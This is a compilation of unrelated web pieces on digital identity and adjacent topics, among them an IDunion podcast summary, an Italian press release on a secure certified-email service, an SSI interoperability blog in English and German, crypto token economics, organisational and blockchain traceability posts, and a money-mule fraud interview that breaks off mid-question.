<p>What use cases should a National Digital Identity program prioritize in collaboration with the private sector? As use cases become verticals of their own, what are then some of the horizontal considerations that need to be applied to enable all of the use cases to function within their relative ecosystems? Hakan Yildiz can help us answer these questions being that he’s a Research Associate at TU Berlin and a Consortium Partner at <a href="https://idunion.org/?lang=en">IDunion</a>.</p>
<p></p>
<p>&nbsp;</p>
<p>About Episode<br>
During this conversation, we discuss:</p>
 
 IDunion 101: a general overview, what are some of the early credentials being issued by government (people and legal entity VCs) and some of the existing ecosystem participants 
 IDunion Use Cases (Verticals): what are some of the government use cases (eHealth, eGov and Education)? What are some of the private sector use cases (Financial, Hospitality, IAM)? 
 IDunion Workstreams (Horizontals): governance, cybersecurity, wallet security, UX, interoperability and more.

 Le due società del Gruppo Tinexta offrono al mercato una soluzione unica, in grado di intercettare malware e truffe prima che possano entrare nella casella di posta 



<p>Roma, 04 ottobre 2021 – InfoCert, la più grande Autorità di Certificazione europea, e Yoroi, attiva nello sviluppo di sistemi integrati di difesa cibernetica, annunciano il rilascio di Legalmail Security Premium, una nuova soluzione di Posta Elettronica Certificata che si distingue per la capacità di combinare la forza legale della PEC con i più alti standard di sicurezza informatica.</p>



<p>Grazie alla collaborazione tra le due aziende, leader nei rispettivi settori di mercato, i clienti di Legalmail potranno avvalersi del servizio di protezione “Legalmail Security Premium”. Il servizio, basato sulla sandbox Yomi di Yoroi, consente di bloccare le comunicazioni sospette, intercettando e neutralizzando elementi malevoli come allegati e/o link prima della consegna del messaggio.</p>



<p>Il livello di sicurezza verrà così aumentato e sarà in grado di fronteggiare al meglio la nuova ondata di cyberattacchi, la cui efficacia è legata molto spesso alla capacità di ingannare gli utenti, inducendoli a cliccare su allegati o link all’apparenza innocui ma con conseguenze potenzialmente drammatiche. La PEC è diventata uno strumento irrinunciabile nella quotidianità, e per tale motivo un canale sempre più appetibile per gli attacchi informatici: basti pensare che, nel prima semestre del 2021, il numero di caselle attive ha superato i 13 milioni, per un totale di oltre 1 miliardo di messaggi scambiati.</p>



<p>“Aumentare i livelli di sicurezza della PEC è un impegno per noi inderogabile. Ciò è confermato anche dal recente rafforzamento di tutte le caselle Legalmail grazie alla possibilità di attivare l’autenticazione a doppio fattore (o strong authentication). Il bisogno di sicurezza non deve però intaccare la facilità d’uso e gli elevati livelli prestazionali che contraddistinguono il prodotto Legalmail e che ne decretano il successo di mercato: la sinergia con Yoroi ci ha consentito di rispondere in pieno a questa duplice sfida. Il risultato è una soluzione all’avanguardia che non ha eguali sul mercato, permettendo di agire da filtro attivo e intelligente a protezione dei nostri clienti”, commenta Carmine Auletta, Chief Innovation &amp; Strategy Officer di InfoCert.</p>



<p>“Il nostro lavoro è proteggere le persone in tutte le attività quotidiane. Molti attacchi ransomware verso la Sanità e le aziende cominciano cliccando su un link o un allegato malevoli. L’email è uno dei veicoli principali attraverso cui i cybercriminali cercano di entrare nella nostra casa virtuale e noi vogliamo fare tutto ciò che è possibile per impedirglielo”, conclude Marco Ramilli, Ceo di Yoroi.</p>



<p>InfoCert SpA</p>



<p>InfoCert, Tinexta Group, è la più grande Certification Authority europea, attiva in oltre venti Paesi. La società eroga servizi di digitalizzazione, eDelivery, Firma Digitale e conservazione digitale dei documenti ed è gestore accreditato AgID dell’identità digitale nell’ambito di SPID (Sistema Pubblico per la gestione dell’Identità Digitale). InfoCert investe in modo significativo nella ricerca e sviluppo e nella qualità: detiene un significativo numero di brevetti mentre le certificazioni di qualità ISO 9001, 27001 e 20000 testimoniano l’impegno ai massimi livelli nell’erogazione dei servizi e nella gestione della sicurezza. Il Sistema di Gestione della Sicurezza delle Informazioni InfoCert è certificato ISO/IEC 27001:2013 per le attività EA:33-35. InfoCert è leader europeo nell’offerta di servizi di Digital Trust pienamente conformi ai requisiti del Regolamento eIDAS (regolamento UE 910/2014) e agli standard ETSI EN 319 401, e punta a crescere sempre di più a livello internazionale anche mediante acquisizioni: detiene il 51% di Camerfirma, una delle principali autorità di certificazione spagnole e il 16,7% di Authada, Identity Provider tedesco all’avanguardia. InfoCert, infine, è proprietaria dell’80% delle azioni di Sixtema SpA, il partner tecnologico del mondo CNA, che fornisce soluzioni tecnologiche e servizi di consulenza a PMI, associazioni di categoria, intermediari finanziari, studi professionali ed enti.</p>



<p>Yoroi Srl – Tinexta Cyber SpA</p>



<p>Yoroi Srl è un’azienda che gestisce Sistemi Integrati Adattivi e Dinamici di Difesa Cibernetica e sviluppata tecnologie proprietarie che hanno ottenuto significativi riconoscimenti anche sul mercato internazionale.

Because of this fact, the anti-money laundering (AML), know your customer (KYC), and other financial crime-related obligations of investment advisors vary considerably from those of banks, broker-dealers, or other formal financial institutions.

 What is interoperability, what needs to be done to achieve it in the SSI world, and what is the way forward? 



 Why can SSI end up like the tower of Babel? 



<p>There is a lot of activity in the SSI community. Different technological camps are coming together and are working on new common protocols and standards. The goal is to establish interoperability and eliminate security and privacy issues that have been identified in the current solutions. This is an extremely positive development. The community is optimistic and sometimes even euphoric.</p>



<p>BUT, SSI is getting more and more attention on the market. Projects are getting bigger and customers are pushing towards productive systems.  That brings the risk that “obsolete” protocols and/or self-developed ad-hoc solutions will be implemented. “SSI” newcomers see an attractive business opportunity and prioritize profit over SSI principles and commonly agreed protocols. This would result in implementations not being interoperable. In the worst case, we end up with implementations that are advertised as SSI but are proprietary and central systems. You could say a kind of “SSI-washing”.</p>



<p>A lot of discussions is about interoperability. But what does it really mean for all the developers like Jolocom? In this logbook entry, I try to structure the term and make it more tangible.</p>



 Different levels of interoperability 



<p>The German Wikipedia entry for interoperability is a good starting point to explain the different levels (<a href="https://de.wikipedia.org/wiki/Interoperabilit%C3%A4t">link</a>). Sorry to all non-German speaking readers, but you don’t need to read the Wikipedia entry. The explanation decides between the following levels of interoperability:</p>



  the structural level addresses the exchange of data,  the syntax level  addresses the extraction of the data,  the semantic level addresses the interpretation of the data and   the organizational level is dealing with the processes.  



<p>Our goal is pretty clear. We want that different actors/modules/implementations can communicate and exchange data. Furthermore, it is important that the data can be extracted so that they can be interpreted on a semantic level.</p>



<p>The differentiation between syntax and semantic level can be tricky. The following example is taken from <a href="https://www.w3.org/TR/vc-data-model/">W3C Verifable Credential Data Model</a>.  </p>



<p><code>"name": "Jayden Doe",</code></p>



<p>On the syntax level, I only know that the above example is an attribute and it contains a value. But I have no clue what it means. On the semantic level, I know that the attribute presents a name and the name is “Jayden Doe”.</p>



<p>The semantic and the organizational interoperability level are in the influence sphere of the specific use case and are independent for the actual software development process. Because of that we only focus on the structural- and syntax level of interoperability.</p>



 How Interoperability can be achieved? 



<p>How we can achieve interoperability on the structural- and syntax level? We have several options. Simplified, we have the following options:</p>



  We can use the same software,  we can build software on unified standards and protocols or  we develop “Middelware” acting as a translator between different systems.  



<p>To pick the right option we have to take a look at the goals and framework conditions of SSI.</p>



 What are the goals of SSI and which option can be derived from? 



<p>Self Sovereign Identities should be an open public digital infrastructure for all. Therefore, it must be open source and accessible for all. With this requirement a SSI Infrastructure cannot be one software from one supplier. A single software implementation would be a huge barrier, and it would not support innovation and development.</p>



<p>Another important SSI requirement is privacy. A middleware – a translator between systems – would violate privacy goals. If the communication is routed through a middleware for translation, the middleware knows what, when and with whom information is shared, not good.</p>



<p>The only option left is unified standards and protocols. This is the only way to ensure an open ecosystem without violating SSI goals like privacy or face a vendor lock-in.</p>



<p>We all have to work hard on the goal to speak the same language and avoid a Babel-like fate.</p>



<p>Join us at the <a href="https://internetidentityworkshop.com/schedule/">33. Internet Identity Workshop from 12-14. of October</a>. We will run a session about interoperability and discuss how we can achieve it.</p>

 Wieso kann SSI, wie der Turmbau zu Babel enden? 



<p>Im Moment ist in der SSI community einiges in Bewegung. Verschiedene technologische Lager gehen aufeinander zu und man entwickelt ein gemeinsames Verständnis, definiert neue Protokolle und Standards. Diese sollen und werden Interoperabilität herstellen und Sicherheits- und Datenschutzprobleme, die man erkannt hat, beseitigen. Dies ist eine überaus positive Entwicklung und man spürt die Aufbruchsstimmung und Euphorie.</p>



<p>ABER dadurch, dass SSI immer mehr Aufmerksamkeit bekommt, Projekte größer werden und die Entwicklung in Richtung Produktivsysteme geht, steigt auch der Druck. Dies bringt eine große Gefahr mit sich, dass überhastet obsolete Protokolle oder/und eigene ad-hoc Lösungen implementiert werden. Auch “SSI” Neueinsteiger wittern ein attraktives Geschäftsfeld und räumen Profit und Marktanteilen Vorrang gegenüber der SSI Idee ein. Dies würde dazu führen, dass Implementierungen nicht interoperabel sind. Im schlimmsten Fall landen wir bei Implementierungen, die mit SSI beworben werden, aber im Grunde proprietäre und zentrale Systeme sind. Man könnte sagen “SSI-washing”.</p>



<p>Ein Begriff Interoperabilität ist in der SSI Community und in Projekten in aller Munde. Aber was bedeutet Interoperabilität für Softwarehersteller wie Jolocom? In diesem Blogpost versuche ich den Begriff zu strukturieren und greifbar zu machen.</p>



 Ebenen von Interoperabilität 



<p>Der deutsche Eintrag zu Interoperabilität in Wikipedia ist ein guter Startpunkt um die Dinge einzuordnen (<a href="https://de.wikipedia.org/wiki/Interoperabilit%C3%A4t">link</a>). Darin wird zwischen struktureller-, syntaktischer-, semantischer- und organisatorischer    Interoperabilität unterschieden. </p>



  Strukturelle Interoperabilität bezieht sich auf den Austausch von Daten,  Syntaktische auf die Extraktion der Daten,  Semantische auf die Interpretation und  Organisatorische bezieht sich auf die Prozesse.   



<p>Das Ziel ist klar, wir wollen, dass verschiedene Komponenten in einem SSI System miteinander kommunizieren und Daten austauschen können. Des Weiteren ist es wichtig, dass sie diese Daten auch extrahiert werden können, damit sie danach semantisch interpretiert werden können. </p>



<p>Die Unterscheidung zwischen Syntax und Semantik kann schwierig sein. Das folgende Beispiel ist ein Auszug aus dem <a href="https://www.w3.org/TR/vc-data-model/">W3C Verifable Credential Data Model</a>.  Anhand diesem erläutere ich den Unterschied. </p>



<p><code>"name": "Jayden Doe",</code></p>



<p>Auf der syntaktischen Ebene, weiß ich nur, dass der erste Begriff <code>"name"</code> ein Attribut ist und der zweite <code>"Jayden Doe"</code>, der Wert. Ich weiß aber nicht was es bedeutet. Auf der semantischen Eben weiß ich, dass das Attribut den Namen darstellt und der Name “Jayden Doe” ist.</p>



<p>Semantische und organisatorische Interoperabilität liegen in der Einflusssphäre des jeweiligen Anwendungsfalls und sind von der eigentlichen Softwareherstellung zum größten Teil unabhängig. Daher ist für die weitere Betrachtung die strukturelle und die syntaktische Interoperabilität von Relevanz.</p>



 Wie kann man Interoperabilität herstellen? 



<p>Wie kann strukturelle und syntaktische Interoperabilität hergestellt werden? Dafür gibt es verschiedene Wege. Man kann, vereinfacht gesagt</p>



  eine einheitliche Software verwenden oder  Protokolle und Standards definieren oder  “Middelware” entwickeln die zwischen den verschiedenen Systemen als  Übersetzer agiert.  



<p>Um die passende Möglichkeiten auszuwählen, muss man sich Ziele und Rahmenbedingungen vor Augen führen.</p>



 Was sind die Ziele von SSI und welcher Weg leitet sich dadurch ab? 



<p>SSI oder dezentrale Identitäten soll eine öffentliche digitale Plattform für alle sein. Es muss open source und für alle zugänglich sein. Mit diesen Zielen fällt die erste Möglichkeit weg. Eine einheitliche Software für alle würde eine sehr starke Beschränkung darstellen. Innovation würde nicht gefördert werden und der Zugang könnte eingeschränkt werden. </p>



<p>Ein wichtiges weiteres Ziel von SSI ist der Datenschutz, eine Middleware (Übersetzer), also die dritte Möglichkeit, würde dieses Ziel gefährden. Wenn die Kommunikation über einen Übersetzer stattfindet, muss dieser alles mithören, sonst kann er nicht übersetzen. Es muss auch nicht auf bestehende SSI Systeme in Produktion Rücksicht genommen werden. Altlasten und viele verschiedene Systeme sind oft Grund für den Einsatz von Middleware.</p>



<p>Was bleibt also Möglichkeit Nummer zwei. Man muss sich auf einheitliche Protokolle und Standards einigen. Nur so kann sichergestellt werden, dass es keine Einschränkung auf einen Hersteller gibt, der Datenschutz sichergestellt ist und alle Implementierung miteinander sprechen können und somit interoperabel sind.</p>



<p>Wir müssen uns alle gemeinsam anstrengen, dass wir bei einer Sprache bleiben und den SSI Turmbau vollenden. </p>



<p>Wenn Interesse besteht, kommt zum <a href="https://internetidentityworkshop.com/">33. Internet Indentity Workshop vom 12-14. Oktober</a> (Onlineevent). Wir werden eine Session zum Thema halten, um das Thema in der Community zu diskutieren.</p>

 The Shyft Network Token Distribution and Economics — Part&nbsp;3  The Shyft Network Token Economics after the release of&nbsp;mainnet. <p>Hello everyone, Shyft Network has officially launched! We’ve laid the foundation for an entire network that will solve complex problems like institutional adoption and multi-jurisdictional regulation. As the blockchain ecosystem quickly scales before our eyes, the industry is now starting to feel the effects of present-day regulations. The need for a solution, like Shyft Network, has never been more&nbsp;urgent.</p><p>The work is not over as we prepare for the next steps, i.e., continuous protocol improvement, community and ecosystem development, and other incredible products on our pipeline. We decided to publish this post to clarify our token distribution and liquidity schedules now that the mainnet is&nbsp;live.</p> Overview  Inflation <p>In the original Token Economics blog post, we explained that the Network Inflation rate was set at 6% of the Initial Token Universe, i.e., 2,520,000,000 tokens, distributed gradually over several years. The Network Inflation rate is composed of three main elements:</p><p>A. Shyft Runtime Inflation DAO’s — 2%: Perpetual Community Funding and Ongoing Ecosystem Wide Resource Maintenance.</p><p>B. Strong Federation — 2%: Inflation per block is generated to pay for the cost of security; all network transactions fees are eliminated through&nbsp;EIP1559.</p><p>C. Byfrost — 2%: Inflation routed to openly pay for the cost of public bridge nodes for asset-weighted Proof of&nbsp;Stake.</p><p>The launch of the mainnet slightly modified the distribution schedule by delaying the Strong Federation component for, roughly, 3.5 months. This component will also be optimized right after the next mainnet hard-fork as the network introduces improvements like EIP1559 (similar to what Ethereum is going through in the next few&nbsp;weeks).</p><p>Another component of token inflation that changed is the Byfrost Bridge staking, which isn’t currently accumulating and will not count towards circulating supply until Byfrost launches later this&nbsp;year.</p><p>The Runtime Inflation DAO component IS accumulating, and we are working on building the DAO structure, governance components and deployment schedule for this to become available as soon as possible.</p><p>Please note also that we reduced the Advisor allocation by 1.28%, from 5.68% to&nbsp;4.4%.</p> Distribution of the Initial Token&nbsp;Universe <p>Note: The Economic Metagame represents 20% of the Initial Token Universe. It’s a deflationary incentive mechanism.</p><p>As users participate in the Wrap Rewards context, there will be a deflationary reduction in the total universe corresponding to the proportion of total assets (E.g. USDT erc20 token) within the Wrap Rewards contract. 20% of the total initial universe is available to be burned over the first 2 years (if lower, will move to further&nbsp;years).</p><p>The Initial Token Universe can be divided into four main categories to show their nature and destination.</p> DAO-Related Assets <p>DAO Related assets represent all buckets destined for community DAOs and other AMM structures to incentivize the growth and development of our community and our network. These funds are not immediately available to the Shyft Network core team or the Shyft Node Federation.</p> Partner and Purchaser Distributions <p>These allocations represent all SHFT tokens that have been sold, distributed, or granted to early token purchasers, strategic and technical partners, advisors, and early supporters of the&nbsp;project.</p> Treasury-Related Assets <p>These buckets represent SHFT tokens that are currently or will be available to the Shyft Network for the ecosystem, business, and partnership development, subject to distribution locks and schedules.</p> Inflationary Mechanics <p>As discussed in our original Token Economics blog post, the Shyft Network has an inflationary component meant to incentivize the creation and continuity of the Node Federation, allowing for the creation of future DAOs for community expansion.</p> Wrapping up <p>For the purposes of calculating circulating supply, the starting date of distribution schedules is March 26,&nbsp;2021.</p><p>You can find our Shyft Network block explorer here: <a href="https://bx.shyft.network/">Shyft POA&nbsp;Explorer</a></p><p>For updated information on Shyft Network’s token supply, please check out <a href="https://coinmarketcap.com/currencies/shyft-network/">Shyft Network, SHFT live marketcap, chart, and info | CoinMarketCap</a>.</p><p>Shyft Network aggregates trust and contextualizes data to build an authentic reputation, identity, and creditability framework for individuals and enterprises.</p><blockquote>Join our <a href="https://www.shyft.network/signup?userType=network">Newsletter</a></blockquote><blockquote>Telegram (<a href="https://t.me/shyftnetwork">https://t.me/shyftnetwork</a>)</blockquote><blockquote>Follow us on Twitter (<a href="https://twitter.com/shyftnetwork">https://twitter.com/shyftnetwork</a>)</blockquote><blockquote>Check out our GitHub (<a href="https://github.com/ShyftNetwork">https://github.com/ShyftNetwork</a>)</blockquote><blockquote>Check out our website (<a href="https://www.shyft.network/">https://www.shyft.network</a>)</blockquote><blockquote>Check out our Discord (<a href="https://discord.gg/ZcBNW37t">https://discord.gg/ZcBNW37t</a>)</blockquote>

 Our emerging operating logic and how it&nbsp;feels <p>This piece was authored by a member of the Dark Matter Labs team based in the UK as part of the #BeyondtheRules project and, as such, is written in British English and may have particular references to contexts in the&nbsp;UK.</p><p>This blog was written in September 2021 and reflects our learning at that&nbsp;time.</p> Our Context <p>In a context of climate breakdown and technological disruption, Dark Matter Labs works to accelerate societal transition towards collective care, shared agency, long-termism and interconnectedness. We focus on the dark matter — the invisible structures responsible for producing the majority of the world around us, from policy and regulation to finance and data, governance and democratic participation, organisational culture and identity. What we seek to build in the wider world we look to create at a smaller scale in how we organise together.</p><p>Our context as an organisation, and from which the learning that we share here is anchored, is largely defined by&nbsp;being:</p>  A platform for shared&nbsp;missions  Focused on discovery and&nbsp;learning  International with a planetary view  Primarily virtual  Evolving constantly  <p>In <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dark-matter-labs-e59e4f5dd32f">blog 1</a> in this series, we have explored the plural platform for shared missions that drive our work and we looked at some of the foundations that we have built to work with international plurality. In <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dml-2-4-ef87a1e466c">blog 2</a>, we explored how we compound learning and build legibility in the system to improve our efficacy and how we navigate. In <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dark-matter-labs-3-4-73faf8b283e7?source=collection_home---2------0-----------------------">blog 3</a>, we discussed our system of democratic agency and the foundation of care that underpins it. These elements form a foundation for the mission that we work on together, and manifest the meta shifts in mental models and organising logic that we wish to see in the world at the micro-level.</p><p>In this blog, we’ll look at how these various factors come together into an operating ‘logic’, and what it feels like to work like this, as told by people from the Dark Matter Labs team. We’ll then share more about how we structure this organising/operating at DM and how it manifests.</p> Operating Logic <p>The image above seeks to visualise how the core parts of our operating model work together. It also highlights our thinking and practice around where we believe we need consensus in our work and where we need a deep divergence of thought. Namely, that our very broad shared intentions (at the level of the meta-mission) and our mutual obligations to each other are where consensus feels needed. Whilst in the actual what and how of what we create requires many different perspectives and visions for deep learning, creativity and efficacy to be possible. This broad and open consensus of purpose alongside a deep plurality of means and approaches — sat on a platform not of control of each other, but of elevation and ennoblement of each of us — forms the foundation of our&nbsp;work.</p><p>In the coming months, we hope to codify some of our mutual obligations and expectations on how we make and evolve decisions and rules together through a DM constitution that will underpin our work (this is not yet in&nbsp;place).</p> What does this feel&nbsp;like? <p>In this blog series, we’ve tried to share what we are experimenting with at DML around how we organise and what we’ve been learning as we go. We are stumbling, learning and gradually improving still with so much to discover. In this section, we wanted to share what this way of working feels like, straight from the mouths of the team. One week ago an invitation was sent to the whole team inviting them to answer this one question, as&nbsp;follows:</p><blockquote>Preface:</blockquote><blockquote>“As part of writing the next beyond the rules blog we are hoping to give people an idea not only of what how we organise at DM looks like, but what it feels&nbsp;like.</blockquote><blockquote>We would simply love to hear anything you have to share on this to help ground this blog in our reality and make it more&nbsp;human.</blockquote><blockquote>If you have a spare 5 mins please take the time to share thoughts on what working at DM feels like for you it would be hugely appreciated (everything welcome, it’s not a propaganda platform) Everything will be anonymous.”</blockquote><blockquote>Question:</blockquote><blockquote>‘How does it feel — your experience of how we organise at DM? (Answer this any way you&nbsp;like)”</blockquote><p>These were all of the 21 (around 40% of the team) responses in&nbsp;full:</p>What how we organise at DM feels like, as shared by the&nbsp;team<p>The variety of experiences that people have, often at the same time, is one of the aspects that stands out: ‘coherence and incoherence’; ‘liberating and paralysing’; ‘uncomfortable, exhilarating an enriching’; ‘stressful and liberating’. Working like this can feel like many things for people, but rarely does it feel easy or&nbsp;static.</p> Stewarding how we&nbsp;organise <p>As our work and system has grown in scale and complexity, how we organise has required increasing nuance and intention.</p><p>An increasingly growing group of people who have worked on this approach to organising (what we call ‘the dark matter of dark matter’&nbsp;;) ) has made this evolution possible. They have asked questions, identified needs, spotted patterns, built experiments, gathered feedback, designed deeply and introduced and iterated new processes, mechanisms, structures and spaces with care. It is indeed because of the distributed agency in our system that this has been possible, and here we seek to share more on how we steward&nbsp;this.</p><p>We were inspired by the incredible team at <a href="https://civicsquare.cc/">Civic Square</a>, and their ‘block party’ in collaboration with <a href="https://wearesnook.com/">Snook</a>, to map out on&nbsp;<a href="https://kumu.io/">Kumu</a>:</p>  What we might see as ‘pillars’ of how we organise (which will evolve as our understanding of these develops).  The various areas/domains of work that make up these pillars, and their connections to each&nbsp;other.  The people who are working on each area, with domain holders versus domain supporters clarified by the direction of the&nbsp;arrows.  <p>Together these elements give us a dynamic map of our organising system that is easily editable and navigable and can quickly be iterated as the system and our understanding of it&nbsp;evolves.</p>A Kumu map showing DML operating pillars of work, their domains and the people who hold and support&nbsp;them<p>We can zoom into this map to make visible different elements. For example, the domains of work that contribute towards a pillar, such as ‘Compounding Learning’.</p>A section from the Kumu map showing the Compounding Learning pillar and its supporting domains of&nbsp;work<p>Or how domains connect to each other and who works on it. For example, our formal governance domain (for want of a better term — meaning our company articles &amp; legal documents, their membership &amp; voting structures, the company boards and directors and the agreements between the various companies) and how we approach that is deeply linked to our legal and financial architecture, roles and responsibilities, shared spaces and culture and our financial sense-making. There are many people involved in making this ‘formal governance’ possible.</p>A section of the Kumu map showing the Formal Governance domain, who works on it and how it links to other domains of&nbsp;work<p>The people who make up this team and the time they dedicate to it is regularly in flux. It includes:</p>  A core team of 7 (moving towards 9) from across our varied geographies with currently around 5.5FTE of capacity, who mainly also work in some other projects of DM but spend most of their time on our operations and how we&nbsp;organise  A couple of team members who spend around 1.5days/week each in how we organise, whilst being heavily focused on our strategic pipeline, partners and direction of work, bringing this insight into our operations  4–6 team members who work primarily on projects in different geographies but spend a small amount of time (up to 1/2 day/week) on supporting how we organise, either because of specialist skills and/or geographical insight  Various team members who have an interest in particular areas of work and contribute from time to&nbsp;time  All team input every now and again (e.g. new approaches to pay or agreeing a DM constitution)  <p>Generally, we spend around 10–15% of our total team capacity on our operations/organising (it fluctuates, but we notice that investing below 10% means that we get behind, and closer to 15% allows us to keep better on top of needs). About 40% this time is towards maintaining necessary day to day operating systems (such as recruitment, contracts, bookkeeping, payroll, company legal requirements etc) and about 60% in investing in our broader organising philosophy and improved ways of&nbsp;working.</p><p>This group does not perform a central function of control for Dark Matter Labs, and it is not a team that sees itself as in service of the ‘actual work’. To reference<a href="https://twitter.com/ImmyKaur/status/1441021905587343360?s=20"> this beautifully worded comment</a> by Immy Kaur, this part of our work is a site of responsibility and craft in being “the beating heart, core function, soil from which everything flows”.</p><p>As such, the Finance Holder does not tell the team what they can or can’t spend; rather, they help to make sense of our financial information; share insights in a variety of ways; and steward our financial agreements so that people across the system can make independent and informed financial choices. Similarly, the People Holder does not make the hiring decisions; rather, they build insight, research and deep knowledge about beautiful hiring processes; and support teams to hire in a way that is caring for applicants and effective in its&nbsp;outcome.</p> Thank you <p>Thank you for reading, we hope that this blog series provides some insight into what we have been learning at Dark Matter Laboratories in how we’ve been organising. We have only been able to cover some of the factors involved, and haven’t even touched up the work of hiring, onboarding, people policy, offboarding, governance and so much more. We intend to continue sharing what we learn and thank those who we have learned from, built upon and been inspired by along the&nbsp;way.</p><p>This blog is part of a 4-part series on how we organise and govern at Dark Matter Labs, with other blogs&nbsp;here:</p>  <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dark-matter-labs-e59e4f5dd32f">Organising beyond the rules #1 of 4: an international platform for&nbsp;mission</a>  <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dml-2-4-ef87a1e466c">Organising beyond the rules #2 of 4: compounding learning and constructing legibility</a>  <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dark-matter-labs-3-4-73faf8b283e7">Organising beyond the rules #3 of 4: Distributed Agency, Distributed Care</a>  <p>We are so very grateful for the support that we have had from our fellow co-creators in the ecosystem throughout these years at Dark Matter Labs, such as Architecture 00, Civic Square, Radicle, Vinnova, McConnell Foundation, Lankelly Chase, ThirtyPercy, MIS Maison de l’innovation sociale, NatureScot, Climate-KIC, Google Ventures, One Project, The National Lottery Community Fund, UNDP, Morgan Stanley Sustainable Solutions Collaborative and many&nbsp;others.</p><p>Much of what we have piloted in the last year has been supported by our learning through the #BeyondtheRules project, alongside our partners <a href="https://lankellychase.org.uk/">Lankelly Chase</a>, <a href="http://blackthrive.org/">Black Thrive</a>, <a href="https://www.yorkmcn.org/">York MCN Network</a> and <a href="https://www.demsoc.org/">The Democratic Society</a>.

 Inventory Management x Blockchain <p>On September 21, 2021, Ontology, in collaboration with AP. LLC, a Japanese consulting firm with strong ties to domestic research institutes and researchers, announced that their jointly developed blockchain-based anti-falsification program has been linked to the inventory management system of <a href="https://medium.com/ontologynetwork/ontology-partners-with-zaico-to-empower-its-inventory-management-system-increasing-traceability-29a604bf6123">ZAICO</a>, a cloud inventory management software&nbsp;company.</p><p>Founded in 2017, Ontology is a high performance public blockchain specializing in decentralized identity and data. With a suite of business-ready applications, Ontology is attracting worldwide attention as a platform that promotes blockchain-based solutions for enterprises. In 2021, Ontology’s presence in Japan has grown substantially, with its native token “ONT” having been listed on local crypto exchanges Decurret and Huobi&nbsp;Japan.</p><p>Ontology and AP.LLC have been exploring ways to implement Ontology’s blockchain-based program into the inventory management solution provided by ZAICO to improve traceability, transparency, and reliability.</p><p>Now that the development of the program is complete, clients will be able to use blockchain-based, tamper-evident, accurate and traceable inventory management with unprocessed inventory data output from the ZAICO system at a significantly lower&nbsp;cost.</p><p>The program utilizes ZAICO’s CSV output function and inventory data registration/retrieval APIs, and is very user friendly, requiring only a few steps to complete. The inventory data is encrypted and recorded on the Ontology blockchain, ensuring that it remains&nbsp;secure.</p><p>Here is a sample page showing how data registration to blockchain works.</p><p><a href="https://zapc.org">https://zapc.org</a></p><p>The data registered on Ontology blockchain can be verified later to attest its authenticity. Here are samples of successful verification screens.</p><p>This web-based program is designed to be widely used not only in inventory management systems but also in other types of systems that handle ledgers. By holding the utility token <a href="https://zapc.org/">ZAPC</a> when implementing the program, the data registration screen and verification screen can be customized according to the service, which makes it possible to develop it as the user’s own service.

        <p>Bachelor thesis by Vemund Holte Igesund &amp; Fredrik Sebastian Rognstad – Molde University College</p>
<p>Our bachelor thesis sheds light on the problem consumers have when buying fish products. At the time of purchase, consumers have little to no information about the products, and have no choice but to trust all the players in the product’s supply chain. After reading through articles and studies, it turns out that there are a high number of seafood scammers. One solution we have found is for players to use better traceability systems. The requirement for tracking today is a “one up, one down” system. Every actor in a supply chain only needs to know who they are buying the product from, and who they are selling it to, one step up and one step down.</p>
<p>The aim of our case study has been to find out what we as consumers had to do to get the history of three selected fish products from different grocery stores and a fish product from a restaurant. We tried to trace all the products back to the fisherman / breeder and map the supply chains. After trying to track fish products ourselves, we conclude that the “one up, one down” model is not good enough. We also conclude that the traceability systems actually implemented today are not transparent enough for consumers. We have found a possible solution to the problem that will have the opportunity to make the supply chain of fish products more transparent to consumers. It is a traceability system that uses blockchain technology.</p>
<p>The reason why we have chosen blockchain as a possible solution to the problem comes from three of the characteristics of blockchain: immutable, transparent and decentralized. In the work on our task, we were much in dialogue with the company UNISOT, which has recently developed a traceability system that uses blockchain technology for tracking fish products. In the conclusion, we discuss, among other things, what our case study would have looked like if the fish products from Experiments A to D had been integrated into a traceability system such as UNISOT has developed.</p>

<p>During <a href="mailto:https://www.idnow.io/blog/ensure-player-friendly-id-verification/">the EURO 2020 tournament</a>, our ID verification platform picked up a higher number of fraudulent activities across several clients. In the investigation, our fraud agents found patterns of what could be organized crime attacking specific organizations such as ‘Money Mules’.</p>
<p>By leveraging both machine learning and AI solutions as part of our IDnow platform as well as fraud specialists, fraudulent processed ID’s and activities could be successfully identified, and countermeasures initiated.</p>
<p>Incidents like big sports tournaments where the numbers of ‘Money Mules’ drastically spike are where our IDnow QM Manager such as Philomena and Michał come into play. In our interview today we will get to the bottom of ‘Money Mules’ and discuss recruiting tactics and patterns of fraudsters as well as overall consequences for detected ‘Money Mules’.</p>
  
 Philomena, Michał, let us start with the question of what your responsibilities are at IDnow as a QM Manager? 
<p>Philomena: Our team covers two essential parts to ensure that the quality expectations are met for both customers and users. Firstly, we ensure that our agents are aware and follow the high verification standards, which we have to fulfil from a regulatory point of view. Also, we want to ensure that our users have a pleasant experience going through the verification process.</p>
<p>Michał: The second part is to ensure that fraud attempts are prevented. We feel responsible for assisting our users and customers to not fall for fraud patterns.</p>
<p>Therefore, we analyse detected fraud cases, inform agents what to watch out for, and proactively reach out to our customers when we suspect patterns to find a solution immediately, such as when “Money Mules” are active.</p>
 ‘Money Mules’ is a term that often appears in the financial crime world, but also generally in the business world. Probably everyone has a rough idea about it, but in your experience within the identity industry, how would you define ‘Money Mules’? 
<p>Michał: A ‘Money Mule’ is a person who voluntarily provides their data, motivated by the desire to make easy money as criminals offer fast cash for participation in the fraud procedure. They are often fully aware of breaking the law. But there is no proof that they are fully conscious of all the consequences.</p>
<p>The overall process of “Money Mules” looks like that they either open a bank account themselves, and thereafter give an access and total control to criminals. Alternatively, the fraudsters open the accounts with their data. Both ways enable later to perform various financial embezzlement, e.g., money laundering, modern slavery or terrorist finance.</p>
<p>Philomena: It is also very important to differentiate between ‘Money Mule’ and ‘Social Engineering’ scenarios. ‘Money Mules’ are participating in the fraud scenarios, cooperating as part of the criminal schemes.</p>
<p>In a social engineering scenario, a person is considered a victim of a scam. Their collaboration with the fraudster is not as apparent as they get involved through psychological manipulation. These victims are usually unaware that their actions are breaking the law. They are being tricked into opening accounts, for example, through job advertisements.</p>
 Can you give us an example of a Money Mule case that you encountered? What was your learning? 
